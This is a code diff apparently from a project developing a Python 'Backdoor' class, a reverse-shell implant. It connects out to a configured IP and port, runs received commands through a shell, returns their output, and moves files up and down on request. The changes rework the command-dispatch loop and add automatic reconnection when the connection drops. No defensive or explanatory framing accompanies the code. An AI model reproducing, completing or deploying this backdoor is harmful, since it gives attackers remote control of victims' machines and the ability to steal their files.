@@ -17,7 +17,7 @@ class Backdoor:
             self.connect(self.IP, self.PORT)
             
     def exec_cmd(self, cmd):
-        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
         stdout = res.stdout.read().decode().strip()
         stderr = res.stderr.read().decode().strip()
         if stdout:
@@ -70,21 +70,29 @@ class Backdoor:
 
     def run(self):
         while(True):
-            cmd = self.r_recv()
-            cmd = cmd.split(' ')
-            if cmd[0] == "cd" and len(cmd)>1:
-                self.change_dir(cmd[1])
+            try:
+                cmd = self.r_recv()
+                cmd = cmd.split(' ')
+                if cmd[0] == "cd" and len(cmd)>1:
+                    self.change_dir(cmd[1])
+                elif cmd[0] == "download":
+                    print("in download")
+                    self.upload(cmd[1])
+                elif cmd[0] == "upload":
+                    self.download(cmd[1])
+                elif cmd[0] == "terminate":
+                    self.connect(self.IP, self.PORT)
+                elif cmd[0] == "clear":
+                    self.run()
 
-            if cmd[0] == "download":
-                self.upload(cmd[1])
-            if cmd[0] == "upload":
-                self.download(cmd[1])
-            if cmd[0] == "terminate":
+                elif len(cmd)>0:
+                    print('in elif')
+                    cmd = ' '.join(cmd)
+                    result = self.exec_cmd(cmd)
+                    self.r_send(result)
+                    
+            except ConnectionResetError:
                 self.connect(self.IP, self.PORT)
-
-            elif len(cmd)>0:
-                result = self.exec_cmd(cmd)
-                self.r_send(result)
 
 
 
